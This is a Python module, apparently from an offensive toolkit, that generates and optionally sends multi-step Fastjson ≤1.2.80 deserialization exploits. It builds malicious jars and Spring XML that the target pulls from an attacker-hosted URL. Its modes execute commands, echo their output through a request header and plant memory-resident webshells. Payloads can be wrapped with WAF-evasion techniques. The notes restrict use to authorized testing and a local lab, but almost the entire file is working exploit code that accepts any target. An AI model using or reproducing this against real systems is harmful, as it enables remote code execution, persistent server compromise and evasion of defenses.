"""Fastjson ≤1.2.80 证明 PoC：生成多步 payload，可选顺序 POST。"""

from __future__ import annotations

import base64
from pathlib import Path
from typing import Optional
from urllib.parse import urlparse, urlunparse

import httpx

from fastjson_toolkit.poc.bytecode import BytecodePresetOptions, resolve_bytecode_payload
from fastjson_toolkit.poc.echo import (
    build_groovy_echo_jar,
    build_groovy_exec_jar,
    build_spring_echo_xml,
    normalize_engine,
    supports_1280_echo,
)
from fastjson_toolkit.poc.getter import wrap_with_currency
from fastjson_toolkit.poc.memshell import (
    supports_1280_memshell,
    write_spring_memshell_attack_files,
)
from fastjson_toolkit.poc.v1_2_80.attack_assets import build_bean_exec_xml
from fastjson_toolkit.poc.v1_2_80.catalog import get_gadget, list_gadgets
from fastjson_toolkit.poc.v1_2_80.models import (
    Poc1280GenerateOptions,
    Poc1280GenerateResult,
    Poc1280SendOptions,
    Poc1280SendResult,
    normalize_rce_preset,
)
from fastjson_toolkit.poc.v1_2_80.payloads import DEFAULT_ATTACK_BASE, build_steps
from fastjson_toolkit.waf import apply_waf_payloads

COMMON_NOTES = [
    "RCE 证明：postgresql/jython/groovy 统一走预设 "
    "file / custom / exec / echo / memshell（默认 file 写证明文件）。",
    "原理：双 @type 以 java.lang.Exception 作 expectClass，"
    "ThrowableDeserializer.cast → ParserConfig.getDeserializer 缓存字段类型后恢复利用类。",
    "1.2.83 起对 Throwable 子类从 mapping 取出后清空，本链失效。",
    "多步链必须同进程共享 ParserConfig；靶场 http://127.0.0.1:18280/api/fastjson ；"
    "攻击资源（容器内自拉取）http://127.0.0.1:18080/attack/。",
    "payload 含重复 @type，勿再 json.dumps。仅授权测试 / 本地靶场。",
    "getter：$ref 已内嵌；业务点另有期望类时可开 wrap_currency 套 Currency"
    "（MiscCodec，与版本无关；多步链逐步套层）。",
]

_LAB_ATTACK = (
    Path(__file__).resolve().parents[4] / "lab" / "fastjson-1280-lab" / "attack"
)


def _decode_echo_output(headers: dict[str, str], body: str) -> Optional[str]:
    lower = {str(k).lower(): v for k, v in headers.items()}
    b64 = lower.get("x-echo")
    if b64:
        try:
            return base64.b64decode(b64).decode("utf-8", errors="replace")
        except Exception:  # noqa: BLE001
            pass
    text = (body or "").strip()
    if text and (lower.get("x-echo-cmd") or lower.get("x-echo-engine")):
        if "Internal Server Error" not in text:
            return text
    return None


def _prepare_echo_assets(
    gadget: str,
    *,
    engine: str,
    cmd_header: str,
    cmd: str,
    attack_base: str,
) -> tuple[str | None, str | None, Optional[str], Optional[str], list[str]]:
    """返回 (socket_factory_arg, classpath, jar_b64, xml_b64, notes)。"""
    base = attack_base.rstrip("/")
    notes: list[str] = []
    jar_b64: Optional[str] = None
    xml_b64: Optional[str] = None

    if gadget == "groovy":
        jar_bytes, art = build_groovy_echo_jar(
            engine=engine, cmd_header=cmd_header, default_cmd=cmd
        )
        jar_b64 = base64.b64encode(jar_bytes).decode("ascii")
        out = _LAB_ATTACK / "evil-echo.jar"
        try:
            _LAB_ATTACK.mkdir(parents=True, exist_ok=True)
            out.write_bytes(jar_bytes)
            notes.append(f"已写入本地 {out}（若 HTTP 攻击站挂载该目录可直接用）")
        except OSError:
            notes.append("无法写入 lab attack 目录；请自行托管 evil-echo.jar（见 attack_jar_b64）")
        classpath = f"{base}/evil-echo.jar"
        notes.append(
            f"Groovy 回显 jar：engine={engine}，Header {cmd_header}={cmd}；"
            f"classpathList → {classpath}"
        )
        return None, classpath, jar_b64, None, notes

    # postgresql / jython：echo.jar + bean-echo.xml
    art = resolve_bytecode_payload(
        BytecodePresetOptions(
            preset="echo",
            engine=engine,
            cmd_header=cmd_header,
            cmd=cmd,
            class_name="EchoPayload",
        )
    )
    if art is None:
        raise RuntimeError("echo resolve 失败")
    jar_bytes = art.as_jar()
    jar_url = f"{base}/echo.jar"
    xml_bytes = build_spring_echo_xml(jar_url=jar_url, class_name=art.class_name)
    jar_b64 = base64.b64encode(jar_bytes).decode("ascii")
    xml_b64 = base64.b64encode(xml_bytes).decode("ascii")
    try:
        _LAB_ATTACK.mkdir(parents=True, exist_ok=True)
        (_LAB_ATTACK / "echo.jar").write_bytes(jar_bytes)
        (_LAB_ATTACK / "bean-echo.xml").write_bytes(xml_bytes)
        notes.append(f"已写入 {_LAB_ATTACK / 'echo.jar'} 与 bean-echo.xml")
    except OSError:
        notes.append("无法写入 lab attack 目录；请托管 echo.jar + bean-echo.xml（见 result b64）")
    xml_url = f"{base}/bean-echo.xml"
    notes.extend(art.notes)
    notes.append(
        f"Spring XML 回显：engine={engine}，Header {cmd_header}={cmd}；"
        f"socketFactoryArg → {xml_url}（XML 内拉 {jar_url}）"
    )
    return xml_url, None, jar_b64, xml_b64, notes


def _prepare_memshell_assets(
    gadget: str,
    *,
    ms_api: str,
    ms_server: str,
    ms_tool: str,
    ms_type: str,
    ms_path: str,
    ms_jdk: str,
    attack_base: str,
) -> tuple[
    str | None,
    str | None,
    Optional[str],
    Optional[str],
    dict,
    str,
    list[str],
]:
    """返回 (socket_arg, classpath, jar_b64, xml_b64, info, connect, notes)。"""
    base = attack_base.rstrip("/")
    notes: list[str] = []
    art = resolve_bytecode_payload(
        BytecodePresetOptions(
            preset="memshell",
            ms_api=ms_api,
            ms_server=ms_server,
            ms_tool=ms_tool,
            ms_type=ms_type,
            ms_path=ms_path,
            ms_jdk=ms_jdk,
            ms_static_initialize=False,
            ms_jar_url=f"{base}/memshell.jar",
            ms_include_groovy=gadget == "groovy",
        )
    )
    if art is None:
        raise RuntimeError("memshell resolve 失败")
    delivery = (art.meta or {}).get("delivery")
    if delivery is None:
        raise RuntimeError("memshell delivery 缺失")
    info = art.memshell_info or {}
    connect = art.memshell_connect or ""
    notes.extend(art.notes)

    if gadget == "groovy":
        if not delivery.groovy_jar_bytes:
            raise RuntimeError("Groovy 内存马 jar 生成失败")
        jar_b64 = base64.b64encode(delivery.groovy_jar_bytes).decode("ascii")
        out = _LAB_ATTACK / "evil-memshell.jar"
        try:
            _LAB_ATTACK.mkdir(parents=True, exist_ok=True)
            out.write_bytes(delivery.groovy_jar_bytes)
            notes.append(f"已写入本地 {out}")
        except OSError:
            notes.append(
                "无法写入 lab attack 目录；请自行托管 evil-memshell.jar（见 attack_jar_b64）"
            )
        classpath = f"{base}/evil-memshell.jar"
        notes.extend(delivery.notes)
        notes.append(
            f"Groovy 内存马：{info.get('tool')}/{info.get('shell_type')}/{info.get('server')}；"
            f"classpathList → {classpath}"
        )
        notes.append("连接信息：\n" + connect)
        return None, classpath, jar_b64, None, info, connect, notes

    jar_url = f"{base}/memshell.jar"
    jar_b64 = base64.b64encode(delivery.jar_bytes).decode("ascii")
    xml_b64 = base64.b64encode(delivery.spring_xml_bytes).decode("ascii")
    try:
        write_notes = write_spring_memshell_attack_files(_LAB_ATTACK, delivery)
        notes.extend(write_notes)
    except OSError:
        notes.append(
            "无法写入 lab attack 目录；请托管 memshell.jar + bean-memshell.xml"
            "（见 attack_*_b64）"
        )
    xml_url = f"{base}/bean-memshell.xml"
    notes.extend(delivery.notes)
    notes.append(
        f"Spring XML 内存马：{info.get('tool')}/{info.get('shell_type')}/{info.get('server')}；"
        f"socketFactoryArg → {xml_url}（XML 内拉 {jar_url}）"
    )
    notes.append("连接信息：\n" + connect)
    return xml_url, None, jar_b64, xml_b64, info, connect, notes


def _prepare_exec_assets(
    gadget: str,
    *,
    cmd: str,
    attack_base: str,
) -> tuple[str | None, str | None, Optional[str], Optional[str], list[str]]:
    """preset=exec：Spring XML / Groovy 自定义命令（非回显）。"""
    base = attack_base.rstrip("/")
    notes: list[str] = []
    jar_b64: Optional[str] = None
    xml_b64: Optional[str] = None
    shell_cmd = cmd or "id"

    if gadget == "groovy":
        jar_bytes = build_groovy_exec_jar(cmd=shell_cmd)
        jar_b64 = base64.b64encode(jar_bytes).decode("ascii")
        out = _LAB_ATTACK / "evil-exec.jar"
        try:
            _LAB_ATTACK.mkdir(parents=True, exist_ok=True)
            out.write_bytes(jar_bytes)
            notes.append(f"已写入本地 {out}")
        except OSError:
            notes.append("无法写入 lab attack；请托管 evil-exec.jar（见 attack_jar_b64）")
        classpath = f"{base}/evil-exec.jar"
        notes.append(f"Groovy exec jar：cmd={shell_cmd}；classpathList → {classpath}")
        return None, classpath, jar_b64, None, notes

    xml_bytes = build_bean_exec_xml(shell_cmd)
    xml_b64 = base64.b64encode(xml_bytes).decode("ascii")
    try:
        _LAB_ATTACK.mkdir(parents=True, exist_ok=True)
        (_LAB_ATTACK / "bean-exec.xml").write_bytes(xml_bytes)
        notes.append(f"已写入 {_LAB_ATTACK / 'bean-exec.xml'}")
    except OSError:
        notes.append("无法写入 lab attack；请托管 bean-exec.xml（见 attack_xml_b64）")
    xml_url = f"{base}/bean-exec.xml"
    notes.append(f"Spring XML exec：cmd={shell_cmd}；socketFactoryArg → {xml_url}")
    return xml_url, None, jar_b64, xml_b64, notes


def generate_poc_1280(
    options: Optional[Poc1280GenerateOptions] = None,
) -> Poc1280GenerateResult:
    opts = options or Poc1280GenerateOptions()
    entry = get_gadget(opts.gadget)

    socket_arg = opts.socket_factory_arg
    classpath = opts.classpath
    kind = normalize_rce_preset(
        opts.preset, echo=bool(opts.echo), memshell=bool(opts.memshell)
    )
    memshell_on = kind == "memshell"
    echo_on = kind == "echo"
    custom_on = kind == "custom" and entry.id in {"postgresql", "jython", "groovy"}
    exec_on = kind == "exec" and entry.id in {"postgresql", "jython", "groovy"}
    engine = ""
    cmd_header = ""
    jar_b64: Optional[str] = None
    xml_b64: Optional[str] = None
    memshell_info: Optional[dict] = None
    memshell_connect: Optional[str] = None
    extra_notes: list[str] = []

    if memshell_on:
        if opts.echo or opts.preset == "echo":
            extra_notes.append("preset=memshell 优先于 echo")
        if not supports_1280_memshell(entry.id):
            raise ValueError(
                f"gadget={entry.id} 不支持内存马；"
                "请选用 postgresql / jython / groovy"
            )
        attack_base = (opts.attack_base or DEFAULT_ATTACK_BASE).rstrip("/")
        (
            socket_arg,
            classpath,
            jar_b64,
            xml_b64,
            memshell_info,
            memshell_connect,
            extra_notes_ms,
        ) = _prepare_memshell_assets(
            entry.id,
            ms_api=opts.ms_api,
            ms_server=opts.ms_server,
            ms_tool=opts.ms_tool,
            ms_type=opts.ms_type,
            ms_path=opts.ms_path,
            ms_jdk=opts.ms_jdk,
            attack_base=attack_base,
        )
        extra_notes.extend(extra_notes_ms)

    elif echo_on:
        if not supports_1280_echo(entry.id):
            raise ValueError(
                f"gadget={entry.id} 不支持命令回显；"
                "请选用 postgresql / jython / groovy（写文件链无 defineClass/exec 入口）"
            )
        engine = normalize_engine(opts.engine)
        cmd_header = (opts.cmd_header or "X-Cmd").strip() or "X-Cmd"
        attack_base = (opts.attack_base or DEFAULT_ATTACK_BASE).rstrip("/")
        socket_arg, classpath, jar_b64, xml_b64, extra_notes = _prepare_echo_assets(
            entry.id,
            engine=engine,
            cmd_header=cmd_header,
            cmd=opts.cmd or "id",
            attack_base=attack_base,
        )

    elif custom_on:
        attack_base = (opts.attack_base or DEFAULT_ATTACK_BASE).rstrip("/")
        art = resolve_bytecode_payload(
            BytecodePresetOptions(
                preset="custom",
                class_b64=opts.class_b64,
                class_name="CustomPayload",
            )
        )
        if art is None:
            raise RuntimeError("custom resolve 失败")
        jar_bytes = art.as_jar()
        jar_b64 = base64.b64encode(jar_bytes).decode("ascii")
        if entry.id == "groovy":
            classpath = f"{attack_base.rstrip('/')}/evil-custom.jar"
            try:
                _LAB_ATTACK.mkdir(parents=True, exist_ok=True)
                (_LAB_ATTACK / "evil-custom.jar").write_bytes(jar_bytes)
                extra_notes.append(f"已写入 {_LAB_ATTACK / 'evil-custom.jar'}")
            except OSError:
                extra_notes.append("无法写入 lab attack；请托管 evil-custom.jar")
            extra_notes.append(f"自备字节码 Groovy jar；classpathList → {classpath}")
        else:
            jar_url = f"{attack_base.rstrip('/')}/custom.jar"
            xml_bytes = build_spring_echo_xml(jar_url=jar_url, class_name=art.class_name)
            xml_b64 = base64.b64encode(xml_bytes).decode("ascii")
            socket_arg = f"{attack_base.rstrip('/')}/bean-custom.xml"
            try:
                _LAB_ATTACK.mkdir(parents=True, exist_ok=True)
                (_LAB_ATTACK / "custom.jar").write_bytes(jar_bytes)
                (_LAB_ATTACK / "bean-custom.xml").write_bytes(xml_bytes)
                extra_notes.append("已写入 custom.jar 与 bean-custom.xml")
            except OSError:
                extra_notes.append("无法写入 lab attack；请托管 custom.jar + bean-custom.xml")
            extra_notes.append(f"自备字节码；socketFactoryArg → {socket_arg}")
        extra_notes.extend(art.notes)

    elif exec_on:
        attack_base = (opts.attack_base or DEFAULT_ATTACK_BASE).rstrip("/")
        socket_arg, classpath, jar_b64, xml_b64, extra_notes = _prepare_exec_assets(
            entry.id,
            cmd=opts.cmd or "id",
            attack_base=attack_base,
        )

    steps_raw = build_steps(
        entry.id,
        file=opts.file,
        content=opts.content,
        url=opts.url,
        guess_byte=opts.guess_byte,
        host=opts.host,
        port=opts.port,
        user=opts.user,
        socket_factory_arg=socket_arg,
        classpath=classpath,
        outbound=opts.outbound,
        named_pipe_path=opts.named_pipe_path,
    )
    if opts.wrap_currency:
        steps_raw = [
            wrap_with_currency(s, currency_field=opts.currency_field)
            for s in steps_raw
        ]
    steps, waf_techs, waf_notes = apply_waf_payloads(
        steps_raw, opts.waf_techniques, opts.waf_options
    )
    notes = list(COMMON_NOTES)
    notes.append(entry.description)
    notes.extend(extra_notes)
    if entry.steps > 1:
        notes.append(f"本 gadget 共 {len(steps)} 步，请按 steps 顺序发送。")
    if entry.id == "mysql_jdbc":
        if opts.outbound:
            notes.append(
                "出网：需恶意 MySQL（autoDeserialize + ServerStatusDiffInterceptor）。"
            )
        else:
            notes.append(
                f"不出网：先写 Pipe 文件再加载；namedPipePath="
                f"{opts.named_pipe_path or '/tmp/mysql.pcap'}"
            )
    elif not echo_on and not memshell_on and not exec_on:
        notes.append(f"写文件证明：{entry.marker_file} ← {entry.marker_content!r}")
    if opts.wrap_currency:
        notes.append(
            f"已对每步套 java.util.Currency（字段 {opts.currency_field}）以触发 getter。"
        )
    notes.extend(waf_notes)
    return Poc1280GenerateResult(
        ok=True,
        gadget=entry.id,
        title=entry.title,
        payload=steps[-1] if steps else "",
        payload_raw=steps_raw[-1] if waf_techs and steps_raw else None,
        steps=steps,
        steps_raw=steps_raw if waf_techs else [],
        wrap_currency=opts.wrap_currency,
        waf_techniques=waf_techs,
        notes=notes,
        requires=list(entry.requires),
        jdk=entry.jdk,
        echo=echo_on,
        engine=engine,
        cmd_header=cmd_header,
        attack_jar_b64=jar_b64,
        attack_xml_b64=xml_b64,
        memshell=memshell_on,
        memshell_info=memshell_info,
        memshell_connect=memshell_connect,
    )


def _reset_url(target: str) -> str:
    parsed = urlparse(target)
    path = parsed.path.rstrip("/")
    if path.endswith("/fastjson"):
        path = path[: -len("/fastjson")] + "/reset"
    elif path.endswith("/json"):
        path = path[: -len("/json")] + "/api/reset"
    else:
        path = path + "/../reset"
    return urlunparse(parsed._replace(path=path))


def run_poc_1280(
    options: Optional[Poc1280SendOptions] = None,
) -> Poc1280SendResult:
    opts = options or Poc1280SendOptions()
    gen = generate_poc_1280(opts)
    summary = f"已生成 {gen.title}（{len(gen.steps)} 步，未发送）"
    if gen.waf_techniques:
        summary += f"；WAF: {' → '.join(gen.waf_techniques)}"
    if gen.echo:
        summary += f"；echo={gen.engine} header={gen.cmd_header}"
    if gen.memshell:
        summary += "；memshell=on"
    result = Poc1280SendResult(
        ok=True,
        gadget=gen.gadget,
        title=gen.title,
        payload=gen.payload,
        payload_raw=gen.payload_raw,
        steps=gen.steps,
        steps_raw=gen.steps_raw,
        wrap_currency=gen.wrap_currency,
        waf_techniques=gen.waf_techniques,
        sent=False,
        summary=summary,
        notes=gen.notes,
        requires=gen.requires,
        jdk=gen.jdk,
        echo=gen.echo,
        engine=gen.engine,
        cmd_header=gen.cmd_header,
        attack_jar_b64=gen.attack_jar_b64,
        attack_xml_b64=gen.attack_xml_b64,
        memshell=gen.memshell,
        memshell_info=gen.memshell_info,
        memshell_connect=gen.memshell_connect,
    )
    if not opts.send:
        return result

    target = opts.target.strip()
    if not target:
        result.ok = False
        result.summary = "target 不能为空"
        return result

    headers = {"Content-Type": opts.content_type, **(opts.headers or {})}
    if gen.echo and gen.cmd_header:
        headers.setdefault(gen.cmd_header, opts.cmd or "id")
    status_codes: list[int] = []
    previews: list[str] = []
    last_headers: dict[str, str] = {}
    last_body = ""
    try:
        with httpx.Client(
            timeout=opts.timeout,
            proxy=opts.proxy,
            verify=not opts.insecure,
            follow_redirects=True,
            trust_env=False,
        ) as client:
            if opts.reset_cache:
                try:
                    client.post(_reset_url(target), headers=headers)
                except Exception:  # noqa: BLE001
                    pass
            for step in gen.steps:
                resp = client.post(
                    target, content=step.encode("utf-8"), headers=headers
                )
                status_codes.append(resp.status_code)
                previews.append((resp.text or "")[:2000])
                last_headers = {str(k): str(v) for k, v in resp.headers.items()}
                last_body = resp.text or ""
    except Exception as exc:  # noqa: BLE001
        result.ok = False
        result.sent = True
        result.status_codes = status_codes
        result.response_previews = previews
        result.status_code = status_codes[-1] if status_codes else None
        result.response_preview = previews[-1] if previews else ""
        result.summary = f"发送失败: {exc}"
        result.raw = {"error": str(exc), "status_codes": status_codes}
        return result

    echo_out = _decode_echo_output(last_headers, last_body) if gen.echo else None
    result.sent = True
    result.status_codes = status_codes
    result.response_previews = previews
    result.status_code = status_codes[-1] if status_codes else None
    result.response_preview = previews[-1] if previews else ""
    result.echo_output = echo_out
    result.raw = {"status_codes": status_codes, "headers": last_headers}
    result.ok = True
    codes = ",".join(str(c) for c in status_codes)
    if echo_out:
        result.summary = (
            f"已按序 POST {gen.title} ×{len(status_codes)} 步 → HTTP [{codes}]；回显成功"
        )
    else:
        result.summary = (
            f"已按序 POST {gen.title} ×{len(status_codes)} 步 → HTTP [{codes}]"
            + ("（请确认攻击资源已托管且 Header 正确）" if gen.echo else "（请用 GET /api/markers 确认写文件 RCE）")
        )
    return result


__all__ = [
    "COMMON_NOTES",
    "generate_poc_1280",
    "list_gadgets",
    "run_poc_1280",
]
